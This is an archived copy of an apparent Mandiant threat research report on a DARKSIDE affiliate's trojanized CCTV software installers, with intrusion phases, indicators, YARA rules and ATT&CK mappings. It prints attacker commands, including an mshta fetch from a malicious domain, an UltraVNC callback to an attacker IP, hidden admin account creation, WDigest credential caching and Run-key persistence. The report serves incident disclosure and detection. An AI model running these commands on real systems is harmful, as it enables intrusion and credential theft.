{
    "id": "9078e80c-3d59-4436-8d81-6db9ce0efc2a",
    "created_at": "2023-01-12T15:00:01.131309Z",
    "updated_at": "2025-03-27T02:16:55.775897Z",
    "deleted_at": null,
    "sha1_hash": "03e2d62b8df52b1b8e5015853d67eb0f0d446c3d",
    "title": "2021-06-16 - Smoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromise",
    "authors": "",
    "file_creation_date": "2022-05-28T15:50:12Z",
    "file_modification_date": "2022-05-28T15:50:12Z",
    "file_size": 140125,
    "plain_text": "# Smoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromise\n\n**[fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html](https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html)**\n\n## Breadcrumb\n\nThreat Research\n\nTyler McLellan, Robert Dean, Justin Moore, Nick Harbour, Mike Hunhoff, Jared Wilson, Jordan Nuce\n\nJun 16, 2021\n\n17 mins read\n\nSupply Chain\n\nMandiant observed DARKSIDE affiliate UNC2465 accessing at least one victim through a Trojanized\nsoftware installer downloaded from a legitimate website. While this victim organization detected the intrusion,\nengaged Mandiant for incident response, and avoided ransomware, others may be at risk.\n\n[As reported in the Mandiant post, \"Shining a Light on DARKSIDE Ransomware Operations,\" Mandiant](https://www.mandiant.com/resources/shining-a-light-on-darkside-ransomware-operations)\nConsulting has investigated intrusions involving several DARKSIDE affiliates. UNC2465 is one of those\nDARKSIDE affiliates that Mandiant believes has been active since at least March 2020.\n\n\n-----\n\nThe intrusion that is detailed in this post began on May 18, 2021, which occurred days after the publicly\n[reported shutdown of the overall DARKSIDE program (Mandiant Advantage background). While no](https://advantage.mandiant.com/reports/21-00010945)\nransomware was observed here, Mandiant believes that affiliate groups that have conducted DARKSIDE\nintrusions may use multiple ransomware affiliate programs and can switch between them at will.\n\nSometime in May 2021 or earlier, UNC2465 likely Trojanized two software install packages on a CCTV\nsecurity camera provider website. Mandiant determined the installers were malicious in early June and\nnotified the CCTV company of a potential website compromise, which may have allowed UNC2465 to\nreplace legitimate downloads with the Trojanized ones.\n\nWhile Mandiant does not suspect many victims were compromised, this technique is being reported for\nbroader awareness. Software supply chain attacks can vary greatly in sophistication, from the recent\n[FireEye-discovered SolarWinds attacks to attacks such as this targeting smaller providers. A software supply](https://www.mandiant.com/resources/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor)\nchain attack allows a single intrusion to obtain the benefit of access to all of the organizations that run that\nvictim company’s software; in this case, an installer, rather than the software itself, was modified by\nUNC2465.\n\n**DARKSIDE RaaS**\n\nIn mid-May 2021, Mandiant observed multiple threat actors cite an announcement that appeared to be\nshared with DARKSIDE RaaS affiliates by the operators of the service. This announcement stated that they\nlost access to their infrastructure, including their blog, payment, and content distribution network (CDN)\nservers, and would be closing their service. The post cited law enforcement pressure and pressure from the\nUnited States for this decision.\n\nMultiple users on underground forums have since come forward claiming to be unpaid DARKSIDE affiliates,\nand in some cases privately provided evidence to forum administrators who confirmed that their claims were\nlegitimate. There are some actors who have speculated that the DARKSIDE operator’s decision to close\ncould be an exit scam. While we have not seen evidence suggesting that the operators of the DARKSIDE\nservice have resumed operations, we anticipate that at least some of the former affiliates of the DARKSIDE\nservice will likely identify different ransomware or malware offerings to use within their own operations.\n\nNotably, Mandiant has continued to observe a steady increase in the number of publicly named victims on\nransomware shaming sites within the past month. Despite the recent ban of ransomware-related posts within\nunderground forums, threat actors can still leverage private chats and connections to identify ransomware\nservices. As one example, in mid-May 2021, the operator of the SODINOKIBI (aka REvil) RaaS indicated\nthat multiple affiliates from other RaaS platforms that had shut down were switching to their service. Based\non the perceived profitability of these operations, it is almost certain that numerous threat actors will continue\nto conduct widespread ransomware operations for the foreseeable future.\n\n**Background**\n\nIn June 2021, Mandiant Consulting was engaged to respond to an intrusion. During analysis, Mandiant\ndetermined the initial vector was a trojanized security camera PVR installer from a legitimate website.\nMandiant attributed the overall intrusion activity to DARKSIDE affiliate UNC2465 due to continued use of\ninfrastructure and tooling since October 2020.\n\nOn May 18, 2021, a user in the affected organization browsed to the Trojanized link and downloaded the ZIP.\nUpon installing the software, a chain of downloads and scripts were executed, leading to SMOKEDHAM and\nlater NGROK on the victim’s computer. Additional malware use such as BEACON, and lateral movement\nalso occurred. Mandiant believes the Trojanized software was available from May 18, 2021, through June 8,\n2021.\n\n\n-----\n\nPivoting on the slightly modified, but benign, MSHTA.exe application in VirusTotal, Mandiant identified a\nsecond installer package with the MD5 hash, e9ed774517e129a170cdb856bd13e7e8 (SVStation_Win64B1130.1.0.0.exe), from May 26, 2021, which also connects out the same URL as the Trojanized SmartPSS\ninstaller.\n\n**Supply Chain Intrusion Cycle**\n\n\nIntrusion cycle\n\n\nFigure 1: Intrusion\n\ncycle\n\n**Phase 1: Trojanized Installer Download**\n\nMandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user\nvisited a legitimate site that the victim organization had used before.\n\nThe downloaded file was extracted to\n\nC:\\Users\\[username]\\Downloads\\06212019-General-SMARTPSS-Win32-ChnEng-IS\\General_SMARTPSSWin32_ChnEng_IS_V2.002.0000007.0.R.181023\\SMARTPSSWin32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe.\n\nMandiant confirmed the user intended to download, install, and use the SmartPSS software. Figure 2 shows\nan image of the download page used for SmartPSS software.\n\n\n-----\n\nSmartPSS download page\n\n\nFigure 2: SmartPSS\n\ndownload page\n\n**Phase 2: Nullsoft Installer**\n\nThe installer executable is a Nullsoft installer that when executed wrote two files to\nC:\\ProgramData\\SMARTPSS-Win32_ChnEng_IS. We were able to extract the malicious installer script and\nfiles for analysis using 7-Zip. The relevant section of this installer script is shown below in Figure 3.\n\n\n-----\n\nNullsoft installer script section\n\n\nFigure 3: Nullsoft\n\ninstaller script section\nThe installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe\n(c180f493ce2e609c92f4a66de9f02ed6). The former is a clean installer from the original developer and is\nlaunched first, installing the software as the user may expect. The latter is launched with a command line\nURL executing the content.\n\nThe smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate\noperating system component, but the MD5 hash was unknown. Disassembly analysis of the program\nshowed it was a small application that loaded the IE COM object and launched the function\nRunHTMLApplication() against the command line argument provided. This functionality matched the\nbehavior of the legitimate MSHTA.exe despite the hash discrepancy. Further analysis showed that the\nmalware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5)\nwith only six bytes of data appended, as shown in Figure 4.\n\n\n-----\n\nCyberChef diff between MSHTA.exe and smartpss.exe\n\n\nFigure 4: CyberChef\n\ndiff between MSHTA.exe and smartpss.exe\n\n**Phase 3: Downloaded VBScript and PowerShell**\n\nUpon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241,\nand passed as an argument on the command line.\n\n[Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching](https://staging.community.riskiq.com/article/fdf74f23)\nthe infrastructure that Mandiant previously reported. According to RiskIQ, sdoc[.]xyz shares a registrant with\nkoliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions.\n\nC:\\PROGRAMDATA\\SMARTPSS-Win32_ChnEng_IS\\smartpss.exe hxxp://sdoc[.]xyz/ID-508260156241\n\nThe execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm\nthat was written to a temporary INetCache directory. Mandiant was not able to acquire this file at the time of\nwriting; however, Mandiant was able to recover partial contents of the file.\n\n<html><head>..<script language='VBScript'>..On Error Resume Next\n\n\n-----\n\nAt the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code. It is not clear if\nsdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant. A PCAP from a\nsandbox execution on VirusTotal from May 26, 2021, also showed benign content being served.\n\nPCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning\nmalicious content\n\n\nFigure 5: PCAP from\n\ne9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content\nShortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in\nFigure 6.\n\n\n-----\n\nSMOKEDHAM downloader\n\n\nFigure 6:\n\nSMOKEDHAM downloader\nWithin seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line\nCompiler.\n\ncsc.exe /noconfig /fullpaths @'C:\\Users\\ [username]\\AppData\\Local\\Temp\\qnxfhfim\\qnxfhfim.cmdline'\n\nMandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover\npartial contents of the file.\n\n.../t:library /utf8output /R:'System.dll' /R:'C:\\windows\\Microso\n\nAfter the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain\nlumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.\n\n**Phase 4: SMOKEDHAM Dropper**\n\nThe SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts\nand executes in memory the SMOKEDHAM backdoor. The dropper uses the Add-Type cmdlet to define a\nnew .NET class for the backdoor. The Add-Type cmdlet can be used to define a new .NET class using an\n\n\n-----\n\nexisting assembly or source code files or specifying source code inline or saved in a variable. In this case,\nthe dropper uses SMOKEDHAM backdoor source code that is stored in a variable.\n\nThe SMOKEDHAM backdoor source code is embedded as an encrypted string. The dropper uses the\nConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the\nAdd-Type cmdlet. After defining a new .NET class for the backdoor, the dropper executes the backdoor's\nentry point. The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep\ninterval. Figure 7 shows the deobfuscated SMOKEDHAM dropper.\n\n\nSMOKEDHAM dropper\n\n\nFigure 7:\n\nSMOKEDHAM dropper\n\n**Phase 5: SMOKEDHAM Backdoor**\n\nSMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands,\nincluding screen capture and keystroke capture. The backdoor may also download and execute additional\nPowerShell commands from its command and control (C2) server.\n\nSMOKEDHAM Network Communications\n\nSMOKEDHAM communicates with its C2 server using HTTPS. The backdoor uses domain fronting to\nobfuscate its true C2 server. The fronted domain is configured by an earlier stage of execution and the actual\ndomain is hard-coded in the backdoor. Mandiant observed the fronted domain\n\n\n-----\n\nlumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2\nserver communication.\n\nThe communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP\nPOST requests. The backdoor initiates requests to the C2 server and the C2 server may include commands\nto execute in the responses. The JSON data exchanged between SMOKEDHAM and its C2 server contains\nthree fields: ID, UUID, and Data.\n\nThe ID field contains a unique value generated by the backdoor for the target system.\n\nThe UUID field may contain a unique value used to track command output or be empty. When the C2 server\nresponds with a command to execute, it sets the UUID field to a unique value. SMOKEDHAM then sets the\nsame UUID value in the subsequent HTTP POST request that contains the command output.\n\nThe Data field may contain RC4-encrypted, Base64-encoded command data or be empty. The backdoor\nuses the Data field to send command output to its C2 server. The C2 server uses the Data field to send\ncommands to the backdoor to execute. The backdoor uses an RC4 key configured by an earlier stage of\nexecution to encrypt and decrypt the Data field. Mandiant observed the RC4 key\n_UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption._\n\nSMOKEDHAM Commands\n\nSMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field. The backdoor\nchecks if the plaintext command data begins with one of the following keywords, shown in Table 1.\n\n**Keyword** **Action**\n\ndelay Update its sleep interval\n\nscreenshot Upload a screen capture to its C2 server via a subsequent HTTP POST request\n\nexit Terminate\n\nTable 1: Plaintext command data keywords\n\nIf the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM\nassumes the data contains a PowerShell command and attempts to execute it. The backdoor uploads output\ngenerated by the PowerShell command to its C2 server via a subsequent HTTP POST request.\nIn addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes. The\nbackdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via\nHTTP POST requests.\n\nSMOKEDHAM In Action\n\nSMOKEDHAM was observed executing commands on the target system using PowerShell.\n\nThe following commands were used to collect information about the system and logged in users.\n\n\n-----\n\nnet.exe user\n\nnet.exe users\n\nwhoami.exe\n\nwhoami.exe /priv\n\nsysteminfo.exe\n\nThe following commands were used to create and add the DefaultUser account to the local Administrators\ngroup, and subsequently hide the account from the Windows logon screen.\n\nnet.exe user DefaultUser REDACTED /ADD\n\nnet.exe localgroup Administrators DefaultUser /ADD\n\nreg.exe ADD 'HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' /v DefaultUser /t REG_DWORD /d 0 /f\n\nThe following commands facilitated lateral movement by modifying Terminal Server registry key values to\nenable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA)\nregistry key value to require a password for authentication.\n\nreg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t\nREG_DWORD /d 0 /f\n\nreg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fSingleSessionPerUser /t\nREG_DWORD /d 0 /f\n\nreg.exe ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LimitBlankPasswordUse /t REG_DWORD\n/d 1 /f\n\nAdditionally, SMOKEDHAM modified the WDigest registry key value\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential\nto enable credential caching.\n\n**Phase 6: Follow-on Activity**\n\nSMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC\napplication renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8. These\nfiles were saved to the %APPDATA%\\Chrome\\ directory. The UltraVNC.ini file allowed UltraVNC to connect\nto port 6300 on the loopback address specified by the parameter AllowLoopback=1.\n\n\n-----\n\nContents of UltraVNC.ini\n\n\nFigure 8: Contents\n\nof UltraVNC.ini\nSMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair\n81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.\n\n%APPDATA%\\Chrome\\winvnc.exe' -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 –run\n\nSMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT\nvalue under the current users Run registry key.\n\nreg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ConhostNT /d\n%appdata%\\Chrome\\winvnc.exe\n\n**NGROK Configuration**\n\nSMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that\nwas renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a\nconfiguration file named ngrok.yml. These files were stored in the C:\\ProgramData\\WindNT\\ directory.\nNGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public\ninternet over secure tunnels.\n\n\n-----\n\nFigure 9 and Figure 10 show the contents of VirtualHost.vbs and ngrok.yml files, respectively.\n\n\n-----\n\nContents of VirtualHost.vbs\n\n\nFigure 9: Contents of\n\n\nContents of ngrok.yml\n\n\nVirtualHost.vbs\n\n\n-----\n\nFigure 10: Contents of ngrok.yml\nThe execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an\nNGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.\n\nSMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT\nvalue under the current users Run registry key.\n\nreg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindNT /d\nC:\\ProgramData\\WindNT\\VirtualHost.vbs\n\n**Keylogger Deployment**\n\nThis attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe. The\nkeylogging utility was configured to capture and record keystrokes to C:\\ProgramData\\psh\\System32Log.txt.\n\nMandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging\nutility. The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the\nfollowing persistence locations:\n\nC:\\Users\\[username]\\Start Menu\\Programs\\Startup\\desktop.lnk\n\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.lnk\n\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\console.lnk\n\n**Cobalt Strike Beacon**\n\nThe attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco\n[Systems\\Cisco Jabber\\update.exe. Update.exe was a Go based dropper created using the ScareCrow](https://github.com/optiv/ScareCrow)\nframework. The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using\nCommand Prompt.\n\ncmd.exe /c 'C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe'&&exit\n\nThe execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe\nresulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which\nthen established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.\n\nMandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory. Mandiant was not able to recover\nupdate.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt\nStrike stageless payload.\n\n\n-----\n\n**LSASS Dumping and Lateral Movement**\n\nMandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.DMP,\nand later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\\ndirectory.\n\nFrom this point, the attacker was observed moving laterally to different systems in the environment using\nRemote Desktop Protocol (RDP) connections.\n\n**Conclusion**\n\nUNC2465 established initial access via a Trojanized installer executed by an unsuspecting user. UNC2465\ninteractively established an NGROK tunnel and began moving laterally in less than 24 hours. Five days later,\nUNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and\nconducted credential harvesting via dumping LSASS memory.\n\nRansomware groups continue to adapt and pursue opportunistic access to victims. UNC2465’s move from\ndrive-by attacks on website visitors or phishing emails to this software supply chain attack shows a\nconcerning shift that presents new challenges for detection. While many organizations are now focusing\nmore on perimeter defenses and two-factor authentication after recent public examples of password reuse or\nVPN appliance exploitation, monitoring on endpoints is often overlooked or left to traditional antivirus. A wellrounded security program is essential to mitigate risk from sophisticated groups such as UNC2465 as they\ncontinue to adapt to a changing security landscape.\n\n**Indicators**\n\n_Supply Chain/Trojanized Nullsoft Installer/SmartPSS_\n\nMD5: 1430291f2db13c3d94181ada91681408\n\nFilename: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe\n\nZip MD5: 54e0a0d398314f330dfab6cd55d95f38\n\n_Supply Chain/Trojanized Nullsoft Installer/SVStation_\n\nMD5: e9ed774517e129a170cdb856bd13e7e8\n\nFilename: SVStation_Win64-B1130.1.0.0.exe\n\n_Intermediate Stage_\n\nURL: hxxp://sdoc[.]xyz/ID-508260156241\n\nIP: 185.92.151[.]150\n\n_SMOKEDHAM LOADER_\n\nMD5: f075c2894ac84df4805e8ccf6491a4f4 (Gbdh7yghJgbj3bb.html)\n\nMD5: 05d38c7e957092f7d0ebfc7bf1eb5365\n\n_SMOKEDHAM_\n\nMD5: 127bf1d43313736c52172f8dc6513f56 (in-memory from f075c2894ac84df4805e8ccf6491a4f4)\n\nHost: max-ghoster1.azureedge[.]net (actual C2)\n\nMD5: 9de326bf37270776b78e30d442bda48b (MEtNOcyfkXWe.html)\n\nHost: atlant20 azureedge[ ]net (actual C2)\n\n\n-----\n\nMD5: b06319542cab55346776f0358a61b3b3 (in-memory from 05d38c7e957092f7d0ebfc7bf1eb5365)\nHost: skolibri13.azureedge[.]net (actual C2)\n\n_NGROK_\n\nMD5: e3bc4dd84f7a24f24d790cc289e0a10f (legitimate NGROK renamed to conhost.exe)\n\nMD5: 84ed6012ec62b0bddcd18058a8ff7ddd (VirtualHost.vbs)\n\n_UltraVNC_\n\nIP/Port: 81.91.177[.]54:7234 (using legitimate ULTRAVNC 23b89bf2c2b99fbc1e232b4f86af65f4)\n\n_BEACON_\n\nHost: w2doger[.]xyz\nIP: 185.231.68.102\nMD5: a9fa3eba3f644ba352462b904dfbcc1a (shellcode)\n\n**Detecting the Techniques**\n\nFireEye detects this activity across our platforms. The following contains specific detection names that\nprovide indicators associated with this activity.\n\n**Platform** **Detection Name**\n\n\nFireEye Network\nSecurity\n\nFireEye Email Security\n\nFireEye Detection On\nDemand\n\nFireEye Malware\nAnalysis\n\nFireEye Malware File\nProtect\n\n\nBackdoor.BEACON\nFE_Loader_Win32_BLUESPINE_1\nTrojan.Win32.CobaltStrike\nBackdoor.MSIL.SMOKEDHAM\nMalware.Binary.ps1\nFEC_Backdoor_CS_SMOKEDHAM_1\nSuspicious Process PowerShell Activity\n\n\n-----\n\nFireEye Endpoint\nSecurity\n\n\n**Real-Time Detection (IOC)**\n\nWDIGEST CREDENTIAL EXPOSURE (METHODOLOGY)\nWDIGEST CREDENTIAL EXPOSURE VIA REGISTRY\n(METHODOLOGY)\nSUSPICIOUS CONHOST.EXE A (METHODOLOGY)\nTASKMGR PROCESS DUMP OF LSASS.EXE A (METHODOLOGY)\n\n**Malware Protection (AV/MG)**\n\nTrojan.GenericFCA.Script.533\nTrojan.GenericFCA.Agent.7732\nDropped:Trojan.VBS.VGU\nTrojan.CobaltStrike.FM\nNGRok\nUltra VNC\nSVN Station\nGeneric.mg.a9fa3eba3f644ba3\nGeneric.mg.1626373508569884\n\n**Modules**\n\nProcess Guard (LSASS memory protection)\n\n\nFireEye Helix VNC METHODOLOGY [Procs] (T1021.005)\nWINDOWS ANALYTICS [Abnormal RDP Logon] (T1078)\nWINDOWS ANALYTICS [Recon Commands] (T1204)\nWINDOWS METHODOLOGY [Cleartext Credentials Enabled UseLogonCredential] (T1003.001)\nWINDOWS METHODOLOGY [LSASS Generic Dump Activity]\n(T1003.001)\nWINDOWS METHODOLOGY [LSASS Memory Access] (T1003.001)\nWINDOWS METHODOLOGY [Registry Run Key - reg.exe] (T1547.001)\nWINDOWS METHODOLOGY [User Created - Net Command] (T1136.001)\n\n**Yara Detections**\n\n\n-----\n\nrule Backdoor_Win_SMOKEDHAM\n\n{\nmeta:\n\nauthor = \"Mandiant\"\ndate_created = \"2021-06-10\"\n\nmd5 = \"9de326bf37270776b78e30d442bda48b\"\n\nstrings:\n$C2Method = { 2E 4D 65 74 68 6F 64 20 3D 20 22 50 4F 53 54 22 } //.Method = \"POST\"\n\n$domainFrontingDomain = /\\.[hH]ost\\s*=\\s*\\\"[^\\\"]*\";/\n\n$envCollection1 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E\n74 56 61 72 69 61 62 6C 65 28 22 43 4F 4D 50 55 54 45 52 4E 41 4D 45 22 29 }\n//Environment.GetEnvironmentVariable(\"COMPUTERNAME\")\n\n$envCollection2 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E\n74 56 61 72 69 61 62 6C 65 28 22 55 53 45 52 44 4F 4D 41 49 4E 22 29 }\n//Environment.GetEnvironmentVariable(\"USERDOMAIN\")\n\n$envCollection3 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E\n74 56 61 72 69 61 62 6C 65 28 22 55 53 45 52 4E 41 4D 45 22 29 }\n//Environment.GetEnvironmentVariable(\"USERNAME\")\n\n$functionalityString1 = { 28 22 64 65 6C 61 79 22 29 } //(\"delay\")\n\n$functionalityString2 = { 28 22 73 63 72 65 65 6E 73 68 6F 74 22 29 } //(\"screenshot\")\n\n$functionalityString3 = { 28 22 65 78 69 74 22 29 } //(\"exit\")\n\n$publicStrings1 = \"public string UUID\"\n\n$publicStrings2 = \"public string ID\"\n\n$publicStrings3 = \"public string Data\"\n\n$UserAgentRequest = { 20 3D 20 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 4F 53 56 65 72 73 69 6F\n6E 2E 54 6F 53 74 72 69 6E 67 28 29 3B } // = Environment.OSVersion.ToString();\n\ncondition:\n\nfilesize < 1MB and all of them\n\n}\n\nrule Loader_Win_SMOKEDHAM\n\n{\nmeta:\n\nauthor = \"Mandiant\"\ndate_created = \"2021-06-10\"\n\nmd5 = \"05d38c7e957092f7d0ebfc7bf1eb5365\"\n\nstrings:\n$listedDLLs1 = \"System.Drawing.dll\" fullword\n\n$listedDLLs2 = \"System.Web.Extensions.dll\" fullword\n\n$listedDLLs3 = \"System.Windows.Forms.dll\" fullword\n\n$CSharpLang = {2d 4c 61 6e 67 75 61 67 65 20 43 53 68 61 72 70} // -Language CSharp\n\n$StringConversion = \"convertto-securestring\" nocase\n\n$SecureString1 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72\n76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 53 65 63 75 72 65 53 74 72 69 6e 67 54 6f 42 53 54 52}\n//[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR\n\n$SecureString2 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72\n76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 50 74 72 54 6f 53 74 72 69 6e 67 41 75 74 6f}\n//[System.Runtime.InteropServices.Marshal]::PtrToStringAuto\n\ncondition:\n\nfilesize < 1MB and (1 of ($listedDLLs*)) and $CSharpLang and $StringConversion and\n$SecureString1 and $SecureString2\n\n}\n\n**MITRE ATT&CK UNC2465**\n\n\n-----\n\n**Tactic** **Description**\n\nInitial Access T1189: Drive-by Compromise\n\nT1195.002: Compromise Software Supply Chain\n\nT1566: Phishing\n\nExecution T1053.005: Scheduled Task\n\nT1059.001: PowerShell\n\nT1059.005: Visual Basic\n\nPersistence T1098: Account Manipulation\n\nT1136: Create Account\n\nT1547.001: Registry Run Keys / Startup Folder\n\nT1547.004: Winlogon Helper DLL\n\nT1547.009: Shortcut Modification\n\nDefense Evasion T1027: Obfuscated Files or Information\n\nT1070.006: Timestomp\n\nT1112: Modify Registry\n\nT1140: Deobfuscate/Decode Files or Information\n\nT1218.005: Mshta\n\nT1553.002: Code Signing\n\nT1562.004: Disable or Modify System Firewall\n\nDiscovery T1012: Query Registry\n\nT1033: System Owner/User Discovery\n\nT1082: System Information Discovery\n\nCollection T1056.001: Keylogging\n\nT1113: Screen Capture\n\nT1560: Archive Collected Data\n\nImpact T1486: Data Encrypted for Impact\n\nT1531: Account Access Removal\n\nCommand and Control T1071.001: Web Protocols\n\nT1090.004: Domain Fronting\n\nT1102: Web Service\n\nT1105: Ingress Tool Transfer\n\nT1219: Remote Access Software\n\nT1572: Protocol Tunneling\n\nT1573.002: Asymmetric Cryptography\n\nLateral Movement T1021.004: SSH\n\nT1021.005: VNC\n\nCredential Access T1003.001: LSASS Memory\n\n\n-----\n\nResource Development T1588.003: Code Signing Certificates\n\nT1588.004: Digital Certificates\n\nT1608.003: Install Digital Certificate\n\n**Acknowledgements**\n\nThanks to everyone that contributed analysis and review. Special thanks to Alison Stailey, Joseph Reyes,\nNick Richard, Andrew Thompson, Jeremy Kennelly, Joshua Sablatura, Evan Reese, Van Ta, Stephen\nEckels, and Tufail Ahmed.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-16 - Smoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromise.pdf"
    ],
    "report_names": [
        "2021-06-16 - Smoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromise.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e9f7f836-b77f-4f95-aa02-9e99d32faf1d",
            "created_at": "2024-12-21T02:00:02.857057Z",
            "updated_at": "2025-03-27T02:00:03.472472Z",
            "deleted_at": null,
            "main_name": "UNC2465",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC2465",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535601,
    "ts_updated_at": 1743041815,
    "ts_creation_date": 1653753012,
    "ts_modification_date": 1653753012,
    "files": {
        "pdf": "https://archive.orkl.eu/03e2d62b8df52b1b8e5015853d67eb0f0d446c3d.pdf",
        "text": "https://archive.orkl.eu/03e2d62b8df52b1b8e5015853d67eb0f0d446c3d.txt",
        "img": "https://archive.orkl.eu/03e2d62b8df52b1b8e5015853d67eb0f0d446c3d.jpg"
    }
}